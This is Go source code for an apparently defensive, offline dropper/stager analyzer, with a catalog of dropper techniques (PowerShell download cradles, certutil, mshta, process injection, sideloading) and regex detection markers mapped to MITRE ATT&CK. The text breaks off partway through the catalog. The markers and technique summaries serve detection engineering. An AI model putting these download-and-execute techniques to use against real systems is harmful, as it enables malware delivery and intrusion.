// ODropper — Stager/dropper static analyzer (offline; nothing is executed or fetched).
// Author: khaled.s.haddad   Website: owlsec.org   Language: Go (stdlib only)
// Analyze dropper/stager behavior (simulated), stages, decode, sandbox-evasion
// markers; benign generator patterns for labs. AUTHORIZED TESTING ONLY.
// MITRE ATT&CK T1105 (Ingress Tool Transfer) + related.
package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"math"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

// ---- OWL UI KIT (cyan "owl" house style) — stdlib only. Shared across the suite ----
// CYAN is the primary brand/frame colour; red is reserved for errors and
// CRITICAL/HIGH severities.
const (
	R   = "\033[91m"       // red     — errors / critical
	GRN = "\033[92m"       // green   — success / low
	YLW = "\033[93m"       // yellow  — prompts / warning text
	CY  = "\033[96m"       // cyan    — primary brand & frames
	W   = "\033[97m"       // white   — body text
	B   = "\033[1m"        // bold
	X   = "\033[0m"        // reset
	MG  = "\033[95m"       // magenta — suite name / accents
	BL  = "\033[94m"       // blue    — accents
	DIM = "\033[2m"        // dim     — secondary text
	OR  = "\033[38;5;208m" // orange  — warning markers
	GY  = "\033[90m"       // gray    — muted
	DR  = CY               // legacy alias: former frame colour → cyan
)

var noColor = os.Getenv("NO_COLOR") != "" || !isatty()

func isatty() bool { fi, _ := os.Stdout.Stat(); return (fi.Mode() & os.ModeCharDevice) != 0 }
func col(s string, c ...string) string {
	if noColor {
		return s
	}
	return strings.Join(c, "") + s + X
}
func clear()           { fmt.Print("\033[H\033[2J") }
func line(w int)       { fmt.Println(col(strings.Repeat("─", w), CY)) }
func okMsg(s string)   { fmt.Println("  " + col("[✔] ", GRN+B) + col(s, W)) }
func errMsg(s string)  { fmt.Println("  " + col("[✘] ", R+B) + col(s, R)) }
func warnMsg(s string) { fmt.Println("  " + col("[!] ", OR+B) + col(s, YLW)) }
func info(s string)    { fmt.Println("  " + col("[*] ", CY) + col(s, DIM+W)) }

// banner prints the cyan ANSI-Shadow wordmark and the suite identity block.
func banner() {
	fmt.Println(col(BANNER, CY))
	fmt.Println("  " + col(SUITE+"  ", B+MG) + col("v"+VERSION, YLW))
	fmt.Println("  " + col(SUBLINE, W))
	fmt.Println()
	fmt.Println("  " + col("Developer : ", DIM) + col(AUTHOR, CY) +
		col("   |   Website : ", DIM) + col(WEBSITE, CY))
	fmt.Println(col(strings.Repeat("─", 66), CY))
	fmt.Println()
}
func prompt(label string) string {
	fmt.Print("  " + col("[»] ", YLW) + col(label+": ", W))
	s, _ := bufio.NewReader(os.Stdin).ReadString('\n')
	return strings.TrimSpace(s)
}
func pause() {
	fmt.Print(col("\n  [↩] Press Enter to continue...", YLW))
	bufio.NewReader(os.Stdin).ReadString('\n')
}

// sectionHeader prints a ⬡ heading between two cyan rules.
func sectionHeader(s string) {
	fmt.Println(col(strings.Repeat("─", 66), CY))
	fmt.Println("  " + col("⬡  "+s, B+CY))
	fmt.Println(col(strings.Repeat("─", 66), CY))
	fmt.Println()
}

type menuItem struct {
	key, name, desc, clr string
}

// menu renders the ONode-style main menu and returns the raw selection.
func menu(title string, items []menuItem) string {
	clear()
	banner()
	fmt.Println("  " + col("⬡  "+title, B+CY))
	fmt.Println()
	for _, it := range items {
		fmt.Println("  " + col(pad("["+it.key+"]", 4), it.clr) + "  " +
			col(pad(it.name, 32), W) + col("─ "+it.desc, DIM))
	}
	fmt.Println()
	fmt.Println("  " + col(pad("[H]", 4), YLW+B) + "  " + col(pad("Help & Usage", 32), W) + col("─ How to use, every option, CLI flags & examples", DIM))
	fmt.Println("  " + col(pad("[0]", 4), R) + "  " + col(pad("Exit", 32), W) + col("─ Quit "+APPNAME, DIM))
	fmt.Println()
	fmt.Println(col(strings.Repeat("─", 66), CY))
	return prompt("Select option")
}

const BANNER = `
 ██████╗ ██████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗
██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║   ██║██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝█████╗  ██████╔╝
██║   ██║██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
╚██████╔╝██████╔╝██║  ██║╚██████╔╝██║     ██║     ███████╗██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
`

const APPNAME = "ODropper"
const SUITE = "Owl Dropper Suite"
const TAGLINE = "Stager / Dropper Analyzer"
const SUBLINE = "Decode Layers · Techniques · Kill Chain · IOCs · Sigma · ATT&CK · Grade"
const VERSION = "1.0"
const AUTHOR = "khaled.s.haddad"
const WEBSITE = "owlsec.org"
const PRIMARY_MITRE = "T1105"

func pad(s string, n int) string {
	if len(s) >= n {
		return s
	}
	return s + strings.Repeat(" ", n-len(s))
}
func table(headers []string, rows [][]string) {
	w := make([]int, len(headers))
	for i, h := range headers {
		w[i] = len(h)
	}
	for _, r := range rows {
		for i, c := range r {
			if i < len(w) && len(c) > w[i] {
				w[i] = len(c)
			}
		}
	}
	var hb strings.Builder
	for i, h := range headers {
		hb.WriteString(col(pad(h, w[i]), CY+B))
		if i < len(headers)-1 {
			hb.WriteString(col(" │ ", DR))
		}
	}
	fmt.Println("  " + hb.String())
	seg := make([]string, len(w))
	for i := range w {
		seg[i] = strings.Repeat("─", w[i])
	}
	fmt.Println("  " + col(strings.Join(seg, "─┼─"), DR))
	for _, r := range rows {
		var rb strings.Builder
		for i := range headers {
			v := ""
			if i < len(r) {
				v = r[i]
			}
			rb.WriteString(col(pad(v, w[i]), W))
			if i < len(headers)-1 {
				rb.WriteString(col(" │ ", DR))
			}
		}
		fmt.Println("  " + rb.String())
	}
}

// ====================================================================
//  DOMAIN MODEL
// ====================================================================

// CatalogEntry is a single technique / binary / mechanism / channel
// record in this tool's knowledge base. It is the unit that powers
// the catalog browser, the marker scanner, the planner and exports.
type CatalogEntry struct {
	ID        string
	Name      string
	Category  string
	Platform  string
	Tactic    string
	Technique string
	Severity  string
	Summary   string
	Detail    string
	Commands  []string
	Markers   []string
	Detection []string
	Refs      []string
	Tags      []string
}

// Finding is a single observation produced by scanning an input, by a
// planner, or by a configuration audit. Findings carry MITRE mapping,
// severity and evidence and feed every export format.
type Finding struct {
	RuleID    string   `json:"ruleId"`
	Title     string   `json:"title"`
	Severity  string   `json:"severity"`
	Score     int      `json:"score"`
	Tactic    string   `json:"tactic"`
	Technique string   `json:"technique"`
	File      string   `json:"file,omitempty"`
	Line      int      `json:"line,omitempty"`
	Evidence  string   `json:"evidence,omitempty"`
	Detail    string   `json:"detail,omitempty"`
	Detection string   `json:"detection,omitempty"`
	Refs      []string `json:"refs,omitempty"`
	Fprint    string   `json:"fingerprint"`
}

// Report bundles a full analysis run for export and grading.
type Report struct {
	Tool       string    `json:"tool"`
	Version    string    `json:"version"`
	Tagline    string    `json:"tagline"`
	Generated  string    `json:"generated"`
	Target     string    `json:"target,omitempty"`
	Mode       string    `json:"mode"`
	Findings   []Finding `json:"findings"`
	Grade      string    `json:"grade"`
	Score      int       `json:"score"`
	Summary    string    `json:"summary"`
	MitrePrime string    `json:"mitrePrimary"`
}

// severity ordering / weights
var sevRank = map[string]int{"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}
var sevWeight = map[string]int{"critical": 40, "high": 25, "medium": 12, "low": 5, "info": 1}

func sevColor(s string) string {
	switch strings.ToLower(s) {
	case "critical":
		return R + B
	case "high":
		return R
	case "medium":
		return YLW
	case "low":
		return GRN
	default:
		return GY
	}
}

func fingerprint(parts ...string) string {
	h := sha256.Sum256([]byte(strings.Join(parts, "|")))
	return hex.EncodeToString(h[:])[:16]
}

// ====================================================================
//  CATALOG (tool-specific knowledge base)
// ====================================================================

var catalog = []CatalogEntry{
	{
		ID: "DR-HTMLSMUG", Name: "HTML smuggling dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1027.006", Severity: "high",
		Summary:   "Build blob in browser via JS; download crafted file.",
		Detail:    "Build blob in browser via JS; download crafted file. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# HTML smuggling dropper", "# MITRE T1027.006"},
		Markers:   []string{"MSStream|Blob\\(", "saveAs\\(", "application/octet-stream"},
		Detection: []string{"Hunt markers of HTML smuggling dropper", "Map to T1027.006", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1027.006"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-MACRO", Name: "Office macro dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1059.005", Severity: "high",
		Summary:   "VBA AutoOpen downloads and runs payload.",
		Detail:    "VBA AutoOpen downloads and runs payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Office macro dropper", "# MITRE T1059.005"},
		Markers:   []string{"AutoOpen|Auto_Open|Document_Open", "URLDownloadToFile|CreateObject\\(\\s*\\\"WScript\\.Shell\\\""},
		Detection: []string{"Hunt markers of Office macro dropper", "Map to T1059.005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1059.005"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-LNK", Name: "Malicious LNK dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1204.001", Severity: "high",
		Summary:   "LNK with powershell/cmd payload in Target/args.",
		Detail:    "LNK with powershell/cmd payload in Target/args. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Malicious LNK dropper", "# MITRE T1204.001"},
		Markers:   []string{"\\.lnk\\b", "TargetPath.*powershell", "IconLocation"},
		Detection: []string{"Hunt markers of Malicious LNK dropper", "Map to T1204.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1204.001"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-ISO", Name: "ISO/IMG container dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1553.005", Severity: "high",
		Summary:   "ISO/IMG mounts Mark-of-the-Web bypass then runs payload.",
		Detail:    "ISO/IMG mounts Mark-of-the-Web bypass then runs payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# ISO/IMG container dropper", "# MITRE T1553.005"},
		Markers:   []string{"\\.iso\\b|\\.img\\b", "Mark.of.the.Web|Zone\\.Identifier"},
		Detection: []string{"Hunt markers of ISO/IMG container dropper", "Map to T1553.005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1553.005"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-CAB", Name: "CAB/SFX archive dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1560", Severity: "medium",
		Summary:   "CAB/SFX self-extracting dropper.",
		Detail:    "CAB/SFX self-extracting dropper. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# CAB/SFX archive dropper", "# MITRE T1560"},
		Markers:   []string{"makecab|expand\\.exe|\\.cab\\b", "SFX|WinRAR.*SFX"},
		Detection: []string{"Hunt markers of CAB/SFX archive dropper", "Map to T1560", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1560"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-MSI", Name: "MSI installer dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218", Severity: "medium",
		Summary:   "MSI CustomAction runs payload.",
		Detail:    "MSI CustomAction runs payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# MSI installer dropper", "# MITRE T1218"},
		Markers:   []string{"CustomAction", "msiexec.*/i", "AlwaysInstallElevated"},
		Detection: []string{"Hunt markers of MSI installer dropper", "Map to T1218", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-JSCRIPT", Name: "JScript / HTA dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1059.007", Severity: "high",
		Summary:   "HTA/JS downloads and executes stage.",
		Detail:    "HTA/JS downloads and executes stage. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# JScript / HTA dropper", "# MITRE T1059.007"},
		Markers:   []string{"mshta|ActiveXObject", "WScript\\.Shell", "ADODB\\.Stream"},
		Detection: []string{"Hunt markers of JScript / HTA dropper", "Map to T1059.007", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1059.007"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-VBS", Name: "VBScript dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1059.005", Severity: "high",
		Summary:   "VBS download cradle + Shell.Run.",
		Detail:    "VBS download cradle + Shell.Run. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# VBScript dropper", "# MITRE T1059.005"},
		Markers:   []string{"CreateObject\\(\\s*\\\"MSXML2\\.XMLHTTP\\\"", "Shell\\.Run", "Adodb\\.Stream"},
		Detection: []string{"Hunt markers of VBScript dropper", "Map to T1059.005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1059.005"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-POWERSHELL", Name: "PowerShell download cradle", Category: "Dropper", Platform: "windows",
		Tactic: "TA0011", Technique: "T1059.001", Severity: "high",
		Summary:   "IEX DownloadString cradle.",
		Detail:    "IEX DownloadString cradle. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# PowerShell download cradle", "# MITRE T1059.001"},
		Markers:   []string{"DownloadString|DownloadFile|DownloadData", "IEX\\s*\\(|Invoke-Expression|\\|\\s*IEX\\b", "Net\\.WebClient"},
		Detection: []string{"Hunt markers of PowerShell download cradle", "Map to T1059.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1059.001"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-CERTUTIL", Name: "certutil download dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA1105", Technique: "T1105", Severity: "high",
		Summary:   "certutil -urlcache / -decode staging.",
		Detail:    "certutil -urlcache / -decode staging. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# certutil download dropper", "# MITRE T1105"},
		Markers:   []string{"certutil.*-urlcache", "certutil.*-decode"},
		Detection: []string{"Hunt markers of certutil download dropper", "Map to T1105", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1105"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-BITS", Name: "BITS download dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA1105", Technique: "T1197", Severity: "high",
		Summary:   "bitsadmin / Start-BitsTransfer staging.",
		Detail:    "bitsadmin / Start-BitsTransfer staging. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# BITS download dropper", "# MITRE T1197"},
		Markers:   []string{"bitsadmin.*/transfer", "Start-BitsTransfer"},
		Detection: []string{"Hunt markers of BITS download dropper", "Map to T1197", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1197"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-CURLWGET", Name: "curl/wget dropper", Category: "Dropper", Platform: "linux",
		Tactic: "TA1105", Technique: "T1105", Severity: "medium",
		Summary:   "curl/wget fetch + chmod + exec.",
		Detail:    "curl/wget fetch + chmod + exec. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# curl/wget dropper", "# MITRE T1105"},
		Markers:   []string{"curl\\s+.*-o\\s", "wget\\s+.*-O\\s", "chmod\\s+\\+x"},
		Detection: []string{"Hunt markers of curl/wget dropper", "Map to T1105", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1105"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-PYTHON", Name: "Python dropper", Category: "Dropper", Platform: "cross",
		Tactic: "TA0011", Technique: "T1059.006", Severity: "medium",
		Summary:   "urllib/requests fetch + exec.",
		Detail:    "urllib/requests fetch + exec. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Python dropper", "# MITRE T1059.006"},
		Markers:   []string{"urllib|requests\\.get", "exec\\(|os\\.system"},
		Detection: []string{"Hunt markers of Python dropper", "Map to T1059.006", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1059.006"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-REFLECTIVE", Name: "Reflective DLL dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1620", Severity: "high",
		Summary:   "Load DLL from memory without LoadLibrary.",
		Detail:    "Load DLL from memory without LoadLibrary. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Reflective DLL dropper", "# MITRE T1620"},
		Markers:   []string{"ReflectiveLoader", "reflective.?dll"},
		Detection: []string{"Hunt markers of Reflective DLL dropper", "Map to T1620", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1620"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-DOTNET", Name: "In-memory .NET assembly load", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1620", Severity: "high",
		Summary:   "Assembly.Load(byte[]) of downloaded PE.",
		Detail:    "Assembly.Load(byte[]) of downloaded PE. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# In-memory .NET assembly load", "# MITRE T1620"},
		Markers:   []string{"\\[Reflection\\.Assembly\\]::Load|Assembly\\.Load(?:File|From)?\\s*\\(", "AppDomain.*Load|\\.EntryPoint\\.Invoke"},
		Detection: []string{"Hunt markers of In-memory .NET assembly load", "Map to T1620", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1620"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-SHELLCODE", Name: "Shellcode runner dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1055", Severity: "critical",
		Summary:   "VirtualAlloc + memcpy + CreateThread pattern.",
		Detail:    "VirtualAlloc + memcpy + CreateThread pattern. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Shellcode runner dropper", "# MITRE T1055"},
		Markers:   []string{"VirtualAlloc", "CreateThread|NtCreateThreadEx", "Marshal\\.Copy"},
		Detection: []string{"Hunt markers of Shellcode runner dropper", "Map to T1055", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1055"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-PROCESSINJ", Name: "Process injection dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1055", Severity: "high",
		Summary:   "WriteProcessMemory + CreateRemoteThread.",
		Detail:    "WriteProcessMemory + CreateRemoteThread. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Process injection dropper", "# MITRE T1055"},
		Markers:   []string{"WriteProcessMemory", "CreateRemoteThread", "OpenProcess"},
		Detection: []string{"Hunt markers of Process injection dropper", "Map to T1055", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1055"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-EARLYBIRD", Name: "Early-bird APC dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1055.004", Severity: "high",
		Summary:   "Queue APC on suspended process before resume.",
		Detail:    "Queue APC on suspended process before resume. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Early-bird APC dropper", "# MITRE T1055.004"},
		Markers:   []string{"CREATE_SUSPENDED", "QueueUserAPC"},
		Detection: []string{"Hunt markers of Early-bird APC dropper", "Map to T1055.004", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1055.004"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-PHOLLOW", Name: "Process hollowing dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1055.012", Severity: "high",
		Summary:   "Unmap + rewrite suspended process image.",
		Detail:    "Unmap + rewrite suspended process image. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Process hollowing dropper", "# MITRE T1055.012"},
		Markers:   []string{"NtUnmapViewOfSection", "CREATE_SUSPENDED"},
		Detection: []string{"Hunt markers of Process hollowing dropper", "Map to T1055.012", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1055.012"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-SIDELOAD", Name: "DLL sideload dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1574.002", Severity: "high",
		Summary:   "Plant DLL next to signed EXE.",
		Detail:    "Plant DLL next to signed EXE. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# DLL sideload dropper", "# MITRE T1574.002"},
		Markers:   []string{"sideload", "DllMain", "LoadLibrary"},
		Detection: []string{"Hunt markers of DLL sideload dropper", "Map to T1574.002", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1574.002"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-COM", Name: "COM-based dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1546.015", Severity: "medium",
		Summary:   "COM object downloads/runs payload.",
		Detail:    "COM object downloads/runs payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# COM-based dropper", "# MITRE T1546.015"},
		Markers:   []string{"CoCreateInstance", "InprocServer32"},
		Detection: []string{"Hunt markers of COM-based dropper", "Map to T1546.015", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1546.015"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-WMI", Name: "WMI dropper / remote", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1047", Severity: "high",
		Summary:   "WMI process call create of downloaded binary.",
		Detail:    "WMI process call create of downloaded binary. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# WMI dropper / remote", "# MITRE T1047"},
		Markers:   []string{"Win32_Process.*Create", "wmic.*process\\s+call\\s+create"},
		Detection: []string{"Hunt markers of WMI dropper / remote", "Map to T1047", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1047"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-MSBUILD", Name: "MSBuild inline task dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1127.001", Severity: "high",
		Summary:   "Inline C# task downloads/runs payload.",
		Detail:    "Inline C# task downloads/runs payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# MSBuild inline task dropper", "# MITRE T1127.001"},
		Markers:   []string{"CodeTaskFactory", "InlineTask", "msbuild"},
		Detection: []string{"Hunt markers of MSBuild inline task dropper", "Map to T1127.001", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1127.001"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-INSTALLUTIL", Name: "InstallUtil dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218.004", Severity: "high",
		Summary:   "InstallUtil /U runs uninstall code.",
		Detail:    "InstallUtil /U runs uninstall code. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# InstallUtil dropper", "# MITRE T1218.004"},
		Markers:   []string{"installutil.*/U", "InstallUtil"},
		Detection: []string{"Hunt markers of InstallUtil dropper", "Map to T1218.004", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218.004"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-REGSVR", Name: "regsvr32 / squiblydoo dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218.010", Severity: "high",
		Summary:   "regsvr32 /i:http scrobj.dll.",
		Detail:    "regsvr32 /i:http scrobj.dll. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# regsvr32 / squiblydoo dropper", "# MITRE T1218.010"},
		Markers:   []string{"regsvr32.*/i:https?://", "scrobj\\.dll"},
		Detection: []string{"Hunt markers of regsvr32 / squiblydoo dropper", "Map to T1218.010", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218.010"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-RUNDLL", Name: "rundll32 dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218.011", Severity: "high",
		Summary:   "rundll32 javascript: or DLL export.",
		Detail:    "rundll32 javascript: or DLL export. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# rundll32 dropper", "# MITRE T1218.011"},
		Markers:   []string{"rundll32.*javascript:", "rundll32.*,"},
		Detection: []string{"Hunt markers of rundll32 dropper", "Map to T1218.011", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218.011"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-CONTROL", Name: "control.exe CPL dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218.002", Severity: "medium",
		Summary:   "control.exe loads malicious CPL.",
		Detail:    "control.exe loads malicious CPL. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# control.exe CPL dropper", "# MITRE T1218.002"},
		Markers:   []string{"control\\.exe.*\\.cpl", "Control_RunDLL"},
		Detection: []string{"Hunt markers of control.exe CPL dropper", "Map to T1218.002", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218.002"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-MSHTA", Name: "mshta remote HTA dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218.005", Severity: "critical",
		Summary:   "mshta http://...hta.",
		Detail:    "mshta http://...hta. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# mshta remote HTA dropper", "# MITRE T1218.005"},
		Markers:   []string{"mshta.*https?://", "mshta.*vbscript:"},
		Detection: []string{"Hunt markers of mshta remote HTA dropper", "Map to T1218.005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1218.005"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-CLICKONCE", Name: "ClickOnce dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1204", Severity: "medium",
		Summary:   "ClickOnce .application downloads payload.",
		Detail:    "ClickOnce .application downloads payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# ClickOnce dropper", "# MITRE T1204"},
		Markers:   []string{"\\.application\\b", "dfsvc\\.exe", "ClickOnce"},
		Detection: []string{"Hunt markers of ClickOnce dropper", "Map to T1204", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1204"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-SANDBOX", Name: "Sandbox evasion in dropper", Category: "Dropper", Platform: "cross",
		Tactic: "TA0005", Technique: "T1497", Severity: "medium",
		Summary:   "Sleep / env checks before staging.",
		Detail:    "Sleep / env checks before staging. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Sandbox evasion in dropper", "# MITRE T1497"},
		Markers:   []string{"Sleep\\(\\s*[0-9]{5,}|Start-Sleep\\s+(?:-s\\w*\\s+)?[0-9]{2,}", "IsDebuggerPresent|CheckRemoteDebugger", "VMware|VirtualBox|VBOX|Win32_ComputerSystem"},
		Detection: []string{"Hunt markers of Sandbox evasion in dropper", "Map to T1497", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1497"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-MOTW", Name: "Mark-of-the-Web awareness", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1553.005", Severity: "medium",
		Summary:   "Dropper checks/removes Zone.Identifier.",
		Detail:    "Dropper checks/removes Zone.Identifier. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Mark-of-the-Web awareness", "# MITRE T1553.005"},
		Markers:   []string{"Zone\\.Identifier", "Unblock-File", "MotW"},
		Detection: []string{"Hunt markers of Mark-of-the-Web awareness", "Map to T1553.005", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1553.005"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-STAGED", Name: "Staged vs stageless", Category: "Dropper", Platform: "cross",
		Tactic: "TA0011", Technique: "T1105", Severity: "medium",
		Summary:   "Stager fetches second stage URL.",
		Detail:    "Stager fetches second stage URL. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Staged vs stageless", "# MITRE T1105"},
		Markers:   []string{"stager|stage.?2|second.?stage", "payload.?url"},
		Detection: []string{"Hunt markers of Staged vs stageless", "Map to T1105", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1105"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-ENCODED", Name: "Encoded payload blob", Category: "Dropper", Platform: "cross",
		Tactic: "TA0005", Technique: "T1027", Severity: "medium",
		Summary:   "Base64/hex/XOR embedded payload.",
		Detail:    "Base64/hex/XOR embedded payload. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Encoded payload blob", "# MITRE T1027"},
		Markers:   []string{"FromBase64String", "\\\\\\\\x[0-9a-fA-F]{2}", "-bxor"},
		Detection: []string{"Hunt markers of Encoded payload blob", "Map to T1027", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1027"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-MULTI", Name: "Multi-stage chain", Category: "Dropper", Platform: "cross",
		Tactic: "TA0011", Technique: "T1105", Severity: "high",
		Summary:   "3+ stage download chain.",
		Detail:    "3+ stage download chain. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Multi-stage chain", "# MITRE T1105"},
		Markers:   []string{"stage.?[123]", "next.?stage"},
		Detection: []string{"Hunt markers of Multi-stage chain", "Map to T1105", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1105"},
		Tags:      []string{"dropper", "stager"},
	},
	{
		ID: "DR-LIVING", Name: "LOLBin-only dropper", Category: "Dropper", Platform: "windows",
		Tactic: "TA0005", Technique: "T1218", Severity: "high",
		Summary:   "Uses only signed LOLBins for staging.",
